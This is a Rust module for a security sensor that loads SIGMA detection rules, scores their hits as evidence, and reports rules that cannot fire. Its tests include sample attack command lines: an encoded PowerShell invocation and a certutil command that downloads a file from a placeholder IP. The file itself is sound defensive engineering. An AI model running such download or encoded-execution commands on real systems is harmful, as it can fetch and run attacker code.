//! SIGMA detection rules, scored as pipeline evidence.
//!
//! # What this is
//!
//! [SIGMA] is a vendor-neutral rule format with a large community ruleset
//! written mostly against Sysmon and the Windows event log. This crate loads
//! those YAML rules, evaluates them against our wire events, and produces the
//! same [`Finding`]-shaped evidence the native rules do — a likelihood pair, not
//! a verdict — so a SIGMA hit enters the A5/A8 decision exactly the way a
//! native rule's does.
//!
//! [SIGMA]: https://sigmahq.io
//!
//! # The honest caveats
//!
//! Three, and none of them is a detail:
//!
//! 1. **A SIGMA rule carries no false-positive rate.** Its `level` is a
//!    hand-assigned severity, not a measured pair of conditional probabilities.
//!    [`Level::likelihood`] therefore *synthesises* the pair, which makes a
//!    SIGMA rule's evidence a guess about its miss rate where a native rule's is
//!    a claim someone reasoned about. That is the price of the breadth, and it
//!    is the reason this augments the native rules rather than replacing them.
//!
//! 2. **A rule is only as good as its field mapping.** SIGMA rules are written
//!    against a *log schema*; our events are typed. [`view`] translates between
//!    them, and a field name it does not emit is a rule that loads, looks
//!    healthy, and can never fire. Every rule therefore carries
//!    [`Rule::unmapped_fields`], computed at load.
//!
//! 3. **Not every construct is implemented.** `re`, `base64`, `windash` and the
//!    UTF-16 modifiers are *rejected* at load rather than ignored; see
//!    [`detect`]. A rule this engine cannot evaluate is not loaded at all,
//!    because a silent rule is worse than a missing one.
//!
//! # What is not supported at all
//!
//! Aggregation (`timeframe`, `| count() by ...`), and `logsource` rules keyed on
//! a *service* rather than a category (`service: security`, `service: sysmon`).
//! Both are rejected with a reason at load, and both are reported by
//! [`RuleSet::problems`], so an operator can see what their ruleset lost rather
//! than inferring it from silence.

pub mod detect;
pub mod view;

pub use detect::{Condition, Detection, FieldTest, Op};
pub use view::{EventView, Value};

use asmr::infer::Likelihood;
use model::TelemetryEvent;
use saphyr::{LoadableYamlNode, YamlOwned};
use std::collections::BTreeMap;
use std::path::Path;

/// SIGMA's `level`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl Level {
    /// Parse a rule's `level`. Unknown values are informational rather than an
    /// error: a rule whose level nobody can read is still a rule.
    pub fn parse(source: &str) -> Level {
        match source.trim().to_ascii_lowercase().as_str() {
            "critical" => Level::Critical,
            "high" => Level::High,
            "medium" => Level::Medium,
            "low" => Level::Low,
            _ => Level::Informational,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Level::Informational => "informational",
            Level::Low => "low",
            Level::Medium => "medium",
            Level::High => "high",
            Level::Critical => "critical",
        }
    }

    /// The likelihood pair a SIGMA `level` is treated as.
    ///
    /// **This is a synthesis, not a measurement.** SIGMA has no field for
    /// `P(rule fires | host clean)`, so the `miss` here is this project's
    /// convention rather than the rule author's claim — the exact thing the
    /// native rules are careful about and the reason they are still the better
    /// evidence. The numbers are chosen so that the log-ratios line up with the
    /// native rules' bands: a `critical` SIGMA rule scores like a strong native
    /// rule, an `informational` one like a weak native rule, and a `medium` one
    /// like a single decisive detection.
    pub fn likelihood(self) -> Likelihood {
        let (hit, miss) = match self {
            Level::Critical => (0.90, 0.005),
            Level::High => (0.75, 0.010),
            Level::Medium => (0.50, 0.020),
            Level::Low => (0.30, 0.050),
            Level::Informational => (0.15, 0.100),
        };
        Likelihood::new(hit, miss)
    }
}

/// A rule's `logsource`, restricted to what this engine can match.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LogSource {
    pub product: Option<String>,
    pub category: String,
}

/// One loaded rule.
///
/// The identity fields are `&'static str` because they are *interned once, at
/// load* — see [`intern`]. A rule set is process-lifetime configuration, and
/// interning its identities here is what lets a runtime-loaded rule flow into
/// the pipeline's `Finding` without pushing a lifetime or an owned type through
/// the whole decision path. The cost is a bounded, one-time leak per loaded
/// rule; a reload would intern again, which is why the ruleset is loaded once.
#[derive(Debug, Clone)]
pub struct Rule {
    /// The rule's `id`, or a slug of its title when it has none.
    pub id: &'static str,
    pub title: &'static str,
    pub level: Level,
    /// A MITRE technique from `tags`, or `TA0000` when the rule names none.
    pub technique: &'static str,
    pub logsource: LogSource,
    pub detection: Detection,
    /// Fields the rule reads that [`view`] never produces for its category.
    ///
    /// Informational, and deliberately a union: it lists every field the rule
    /// names, including ones that appear only in a branch the condition does not
    /// require. Whether the rule is actually *dead* is [`Rule::can_fire`], which
    /// is shape-aware.
    pub unmapped_fields: Vec<String>,
}

impl Rule {
    /// Whether this rule could ever match an event.
    ///
    /// Shape-aware: a field this sensor cannot produce makes the rule dead only
    /// when the condition actually requires it. A rule that ORs
    /// `Image|endswith` with a field we do not carry still works, and reporting
    /// it as dead would hide a live rule.
    pub fn can_fire(&self) -> bool {
        let category = self.logsource.category.as_str();
        self.detection
            .satisfiable(&|field| view::field_is_mappable(category, field))
    }

    /// Parse one rule from YAML.
    pub fn parse(source: &str) -> Result<Rule, LoadError> {
        let documents =
            YamlOwned::load_from_str(source).map_err(|e| LoadError(format!("not YAML: {e}")))?;
        let document = documents
            .first()
            .ok_or_else(|| LoadError("empty document".to_string()))?;
        if !document.is_mapping() {
            return Err(LoadError("the document is not a mapping".to_string()));
        }

        let title = string(document, "title").ok_or_else(|| LoadError("no `title`".to_string()))?;
        if title.trim().is_empty() {
            return Err(LoadError("empty `title`".to_string()));
        }

        let id = string(document, "id").unwrap_or_else(|| slug(&title));
        let level = string(document, "level")
            .map(|l| Level::parse(&l))
            .unwrap_or(Level::Informational);
        let technique = technique_from_tags(document);

        let logsource = match document.as_mapping_get("logsource") {
            Some(node) => parse_logsource(node)?,
            None => return Err(LoadError("no `logsource`".to_string())),
        };

        let detection_node = document
            .as_mapping_get("detection")
            .ok_or_else(|| LoadError("no `detection`".to_string()))?;
        let detection = detect::compile(detection_node).map_err(|e| LoadError(e.0))?;

        let unmapped_fields: Vec<String> = {
            let mut seen = Vec::new();
            for field in detection.fields() {
                if !view::field_is_mappable(&logsource.category, field)
                    && !seen.iter().any(|f: &String| f.as_str() == field)
                {
                    seen.push(field.to_string());
                }
            }
            seen
        };

        Ok(Rule {
            id: intern(id),
            title: intern(title),
            level,
            technique: intern(technique),
            logsource,
            detection,
            unmapped_fields,
        })
    }
}

/// One rule firing on one event.
///
/// Everything here is `'static` because the rule it came from is: see [`intern`].
/// A `Hit` therefore needs no lifetime, which is what makes it possible to lift
/// straight into a pipeline `Finding`.
#[derive(Debug, Clone)]
pub struct Hit {
    pub rule_id: &'static str,
    pub title: &'static str,
    pub technique: &'static str,
    pub likelihood: Likelihood,
    /// Human-readable reason. Minimised before it leaves the host, like every
    /// other alert body.
    pub detail: String,
}

/// A loaded ruleset.
#[derive(Debug, Clone, Default)]
pub struct RuleSet {
    rules: Vec<Rule>,
    /// Rule *indices* per logsource category, so evaluation touches only the
    /// rules that could apply instead of scanning the whole set on every event.
    by_category: BTreeMap<&'static str, Vec<usize>>,
    /// One line per rule that did not load, and why.
    problems: Vec<String>,
}

impl RuleSet {
    /// A ruleset with no rules.
    pub fn empty() -> Self {
        Self::default()
    }

    /// A set built from already-parsed rules.
    ///
    /// For a caller that composes a set in memory rather than reading a
    /// directory, and for tests.
    pub fn from_rules(rules: Vec<Rule>) -> Self {
        let by_category = index_by_category(&rules);
        Self {
            rules,
            by_category,
            problems: Vec::new(),
        }
    }

    pub fn rules(&self) -> &[Rule] {
        &self.rules
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// Rules that loaded but can never fire, because they read a field this
    /// sensor does not emit.
    pub fn rules_that_cannot_fire(&self) -> impl Iterator<Item = &Rule> {
        self.rules.iter().filter(|r| !r.can_fire())
    }

    /// Why a file in the directory did not become a rule.
    pub fn problems(&self) -> &[String] {
        &self.problems
    }

    /// Parse a single rule.
    pub fn from_yaml(source: &str) -> Result<Rule, LoadError> {
        Rule::parse(source)
    }

    /// Load every `.yml`/`.yaml` file in a directory.
    ///
    /// A file that does not parse, or that uses a construct this engine does not
    /// implement, is recorded in [`Self::problems`] and the rest still load. A
    /// ruleset where one bad rule silently removed a hundred others would be
    /// worse than the bad rule.
    pub fn from_directory(dir: &Path) -> Result<RuleSet, LoadError> {
        let entries = std::fs::read_dir(dir)
            .map_err(|e| LoadError(format!("cannot read {}: {e}", dir.display())))?;

        // Sorted, because a ruleset that loads in directory order produces
        // reports that differ between machines for no reason.
        let mut paths: Vec<std::path::PathBuf> = entries
            .filter_map(Result::ok)
            .map(|e| e.path())
            .filter(|p| {
                matches!(
                    p.extension().and_then(|e| e.to_str()),
                    Some("yml") | Some("yaml")
                )
            })
            .collect();
        paths.sort();

        let mut rules = Vec::new();
        let mut problems = Vec::new();
        for path in paths {
            let name = path
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| path.display().to_string());
            match std::fs::read_to_string(&path) {
                Ok(source) => match Rule::parse(&source) {
                    Ok(rule) => rules.push(rule),
                    Err(e) => problems.push(format!("{name}: {e}")),
                },
                Err(e) => problems.push(format!("{name}: cannot read: {e}")),
            }
        }

        Ok(RuleSet {
            by_category: index_by_category(&rules),
            rules,
            problems,
        })
    }

    /// Every rule that applies to this event and matches it.
    pub fn evaluate(&self, event: &TelemetryEvent) -> Vec<Hit> {
        // `category_of` reads the shape alone. An event no rule is written for
        // therefore costs nothing — no view, no field map, no allocation — and
        // this is the common case for a ruleset that covers one category.
        let Some(category) = view::category_of(event) else {
            return Vec::new();
        };
        let Some(indices) = self.by_category.get(category) else {
            return Vec::new();
        };
        let Some(view) = EventView::of(event) else {
            return Vec::new();
        };
        indices
            .iter()
            .filter_map(|index| self.rules.get(*index))
            .filter(|rule| rule.detection.matches(&view))
            .map(|rule| Hit {
                rule_id: rule.id,
                title: rule.title,
                technique: rule.technique,
                likelihood: rule.level.likelihood(),
                detail: format!("sigma: {}", rule.title),
            })
            .collect()
    }

    /// A rule's human title, by id.
    ///
    /// The pipeline needs this to title an alert for a rule it did not compile
    /// itself; native rules resolve their own through `rules::rule_title`.
    pub fn title_of(&self, id: &str) -> Option<&'static str> {
        self.rules
            .iter()
            .find(|rule| rule.id == id)
            .map(|r| r.title)
    }
}

// ---------------------------------------------------------------------------
// The category index
// ---------------------------------------------------------------------------

/// Group rule indices by the category they are written against.
///
/// The key is the canonical `&'static str` from [`view::CATEGORIES`], not a copy
/// of the rule's own `String`: a category outside that list can never be produced
/// by a view, so it is left out — the linear scan it replaces could not have
/// matched those rules either.
fn index_by_category(rules: &[Rule]) -> BTreeMap<&'static str, Vec<usize>> {
    let mut index: BTreeMap<&'static str, Vec<usize>> = BTreeMap::new();
    for (at, rule) in rules.iter().enumerate() {
        let Some(category) = view::CATEGORIES
            .iter()
            .find(|category| **category == rule.logsource.category)
        else {
            continue;
        };
        index.entry(category).or_default().push(at);
    }
    index
}

// ---------------------------------------------------------------------------
// Interning
// ---------------------------------------------------------------------------

/// Give a string the lifetime of the process.
///
/// # Why this is deliberate
///
/// The pipeline identifies a rule by `&'static str` — `Finding.rule`, the
/// metrics map key, the coalescing map key — and native rules satisfy it with
/// literals. A rule loaded at runtime has no such literal, so it either gets one
/// here or the pipeline's identity type has to become owned, which would push a
/// lifetime (or an allocation per finding) through every native rule too.
///
/// The rule set is process-lifetime configuration loaded once, so the leak is
/// bounded and paid once. Reloading would intern the same rule again; if reload
/// is ever added, this is the place that has to change.
fn intern(value: String) -> &'static str {
    Box::leak(value.into_boxed_str())
}

// ---------------------------------------------------------------------------
// YAML helpers
// ---------------------------------------------------------------------------

fn string(document: &YamlOwned, key: &str) -> Option<String> {
    document
        .as_mapping_get(key)
        .and_then(|v| v.as_str())
        .map(str::to_string)
}

/// The first `attack.tXXXX` tag, uppercased.
fn technique_from_tags(document: &YamlOwned) -> String {
    let Some(tags) = document
        .as_mapping_get("tags")
        .and_then(|t| t.as_sequence())
    else {
        return "TA0000".to_string();
    };
    for tag in tags {
        let Some(tag) = tag.as_str() else {
            continue;
        };
        let lower = tag.to_ascii_lowercase();
        if let Some(rest) = lower.strip_prefix("attack.t") {
            return format!("T{rest}").to_ascii_uppercase();
        }
    }
    "TA0000".to_string()
}

fn parse_logsource(node: &YamlOwned) -> Result<LogSource, LoadError> {
    let product = node
        .as_mapping_get("product")
        .and_then(|v| v.as_str())
        .map(str::to_string);
    if let Some(product) = &product
        && !product.eq_ignore_ascii_case(view::PRODUCT)
    {
        return Err(LoadError(format!(
            "logsource product `{product}` is not `{}`",
            view::PRODUCT
        )));
    }

    if let Some(service) = node.as_mapping_get("service").and_then(|v| v.as_str()) {
        return Err(LoadError(format!(
            "logsource service `{service}` is not mapped; this engine matches on category only"
        )));
    }

    let Some(category) = node.as_mapping_get("category").and_then(|v| v.as_str()) else {
        return Err(LoadError(
            "logsource names no category, and service-based log sources are not mapped".to_string(),
        ));
    };
    if !view::CATEGORIES.contains(&category) {
        return Err(LoadError(format!(
            "logsource category `{category}` has no event mapping"
        )));
    }

    Ok(LogSource {
        product,
        category: category.to_string(),
    })
}

/// A stable, human-readable id from a title.
fn slug(title: &str) -> String {
    title
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_lowercase()
            } else {
                '_'
            }
        })
        .collect::<String>()
        .trim_matches('_')
        .to_string()
}

/// Why a rule did not load.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LoadError(pub String);

impl std::fmt::Display for LoadError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for LoadError {}

#[cfg(test)]
mod tests {
    use super::*;
    use model::{
        EventId, EventKind, EventSource, FileCreate, FileWrite, HostId, Payload, ProcessId,
        ProcessStart, ProviderId,
    };

    /// A minimal, well-formed rule.
    const RULE: &str = r#"
title: Encoded PowerShell Command Line
id: 11111111-2222-3333-4444-555555555555
status: test
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - ' -enc '
            - ' -EncodedCommand '
    condition: selection
"#;

    fn process(image: &str, cmd: &str) -> TelemetryEvent {
        TelemetryEvent::new(
            EventId::new(1),
            HostId::new("host-a").unwrap(),
            chrono::Utc::now(),
            EventSource::WindowsEtw,
            ProviderId::new("Microsoft-Windows-Security-Auditing"),
            4688,
            42,
            42,
            4,
            EventKind::ProcessStart(ProcessStart {
                pid: ProcessId::new(42),
                parent_pid: Some(ProcessId::new(4)),
                executable: image.into(),
                command_line: Some(cmd.into()),
                user: None,
                working_directory: None,
                started_at: chrono::Utc::now(),
                image_hash: None,
                integrity_level: None,
                is_wow64: false,
                parent_image: None,
            }),
            Payload::empty(),
        )
    }

    #[test]
    fn a_rule_parses_into_its_parts() {
        let rule = Rule::parse(RULE).expect("parses");
        assert_eq!(rule.title, "Encoded PowerShell Command Line");
        assert_eq!(rule.level, Level::High);
        assert_eq!(rule.technique, "T1059.001");
        assert_eq!(rule.logsource.category, "process_creation");
        assert!(rule.can_fire(), "{:?}", rule.unmapped_fields);
    }

    #[test]
    fn a_rule_fires_on_the_event_it_describes() {
        let rules = RuleSet::from_rules(vec![Rule::parse(RULE).expect("parses")]);
        let hits = rules.evaluate(&process(
            "C:\\Windows\\System32\\powershell.exe",
            "powershell.exe -EncodedCommand SQBFAFgA",
        ));
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].technique, "T1059.001");
        // The likelihood comes from the level, and it is a synthesis.
        assert_eq!(hits[0].likelihood, Level::High.likelihood());
    }

    #[test]
    fn the_same_rule_does_not_fire_on_an_ordinary_invocation() {
        let rules = RuleSet::from_rules(vec![Rule::parse(RULE).expect("parses")]);
        assert!(
            rules
                .evaluate(&process(
                    "C:\\Windows\\System32\\powershell.exe",
                    "powershell Get-Service"
                ))
                .is_empty()
        );
    }

    #[test]
    fn a_rule_reading_a_field_we_do_not_emit_is_reported_not_hidden() {
        // The failure this crate exists to make visible: the rule loads, and can
        // never fire. `OriginalFileName` is a real Sysmon field and a plausible
        // thing for a rule to key on; this sensor does not carry it.
        let source = RULE.replace(
            "Image|endswith: '\\powershell.exe'",
            "OriginalFileName|endswith: 'powershell.exe'",
        );
        let rule = Rule::parse(&source).expect("parses");
        assert!(!rule.can_fire());
        assert_eq!(rule.unmapped_fields, vec!["OriginalFileName".to_string()]);
    }

    #[test]
    fn a_level_becomes_a_likelihood_monotone_in_severity() {
        let mut previous = Level::Informational.likelihood().log_ratio();
        for level in [Level::Low, Level::Medium, Level::High, Level::Critical] {
            let current = level.likelihood().log_ratio();
            assert!(current > previous, "{level:?} is not stronger");
            previous = current;
        }
    }

    #[test]
    fn a_service_based_rule_is_rejected_with_a_reason() {
        // A large share of the Windows ruleset is keyed on a service. Saying so
        // is better than loading it into a sensor that can never match it.
        let source = RULE.replace(
            "    category: process_creation",
            "    service: security\n    category: process_creation",
        );
        let error = Rule::parse(&source).expect_err("must be rejected");
        assert!(error.0.contains("service"), "{}", error.0);
    }

    #[test]
    fn an_unmapped_category_is_rejected_with_a_reason() {
        let source = RULE.replace("category: process_creation", "category: registry_event");
        let error = Rule::parse(&source).expect_err("must be rejected");
        assert!(error.0.contains("registry_event"), "{}", error.0);
    }

    #[test]
    fn a_rule_without_a_title_is_rejected() {
        let error = Rule::parse("logsource:\n    category: process_creation\ndetection:\n    s:\n        Image: 'x'\n    condition: s\n")
            .expect_err("must be rejected");
        assert!(error.0.contains("title"), "{}", error.0);
    }

    #[test]
    fn a_tag_becomes_a_technique_and_a_missing_one_becomes_ta0000() {
        let source = RULE.replace("    - attack.t1059.001\n", "");
        let rule = Rule::parse(&source).expect("parses");
        assert_eq!(rule.technique, "TA0000");
    }

    #[test]
    fn a_field_we_cannot_emit_in_one_alternative_does_not_kill_the_rule() {
        // The shape a real ruleset is full of. `selection_img` ORs a field we
        // have with one we do not, so the rule still works and calling it dead
        // would be wrong — the same mistake as trusting a rule that can never
        // fire, pointed the other way.
        let source = r#"
title: Certutil download
id: test-disjunction
level: medium
tags:
    - attack.t1105
logsource:
    product: windows
    category: process_creation
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_flags:
        CommandLine|contains: 'urlcache'
    condition: all of selection_*
"#;
        let rule = Rule::parse(source).expect("parses");
        assert!(rule.can_fire(), "the Image branch still works");
        assert_eq!(rule.unmapped_fields, vec!["OriginalFileName".to_string()]);

        let rules = RuleSet::from_rules(vec![rule]);
        assert_eq!(
            rules
                .evaluate(&process(
                    "C:\\Windows\\System32\\certutil.exe",
                    "certutil -urlcache -f http://198.51.100.7/a a"
                ))
                .len(),
            1,
            "and it fires on the event it describes"
        );
    }

    /// An event of the given shape, for exercising the evaluator's category path.
    fn file_event(pid: ProcessId, path: &str, created: bool) -> TelemetryEvent {
        let now = chrono::Utc::now();
        let kind = if created {
            EventKind::FileCreate(FileCreate {
                pid,
                path: path.into(),
                created_at: now,
            })
        } else {
            EventKind::FileWrite(FileWrite {
                pid,
                path: path.into(),
                size: None,
                bytes_written: None,
                written_at: now,
            })
        };
        TelemetryEvent::new(
            EventId::new(2),
            HostId::new("host-a").unwrap(),
            now,
            EventSource::WindowsEtw,
            ProviderId::new("Microsoft-Windows-Kernel-File"),
            11,
            42,
            42,
            4,
            kind,
            Payload::empty(),
        )
    }

    #[test]
    fn an_event_no_rule_is_written_for_evaluates_to_nothing() {
        // The early return. A ruleset is mostly rules for shapes an event is not,
        // so evaluation must not build a view — nor scan the rules — for them.
        let rules = RuleSet::from_rules(vec![Rule::parse(RULE).expect("parses")]);
        assert!(!rules.is_empty(), "the ruleset really is non-empty");
        // `file_event` is a mapped category with no rule in this ruleset.
        assert!(
            rules
                .evaluate(&file_event(ProcessId::new(42), "C:\\Temp\\a.exe", true))
                .is_empty()
        );
        // And a shape with no SIGMA category at all takes the same path.
        assert!(
            rules
                .evaluate(&file_event(ProcessId::new(42), "C:\\Temp\\a.log", false))
                .is_empty()
        );
    }

    #[test]
    fn the_index_keeps_every_rule_for_its_category() {
        // The index is what makes evaluation cheap; a rule dropped from it would
        // be a rule that stops firing with nothing to show for it.
        let rule = Rule::parse(RULE).expect("parses");
        let rules = RuleSet::from_rules(vec![rule.clone(), rule]);
        assert_eq!(
            rules
                .evaluate(&process(
                    "C:\\Windows\\System32\\powershell.exe",
                    "powershell.exe -EncodedCommand SQBFAFgA"
                ))
                .len(),
            2,
            "both copies are indexed under process_creation"
        );
    }

    #[test]
    fn the_bundled_rules_load_and_every_one_can_fire() {
        // The rules in `rules/` are what an operator copies. If one of them
        // loads but cannot fire, it is a dead example that looks like a live
        // one — the failure this crate exists to make visible.
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("rules");
        let rules = RuleSet::from_directory(&dir).expect("the rules directory reads");
        assert!(rules.problems().is_empty(), "{:?}", rules.problems());
        assert!(!rules.is_empty(), "no rules loaded from {}", dir.display());
        for rule in rules.rules_that_cannot_fire() {
            panic!(
                "`{}` cannot fire: never emits {:?}",
                rule.title, rule.unmapped_fields
            );
        }
    }
}
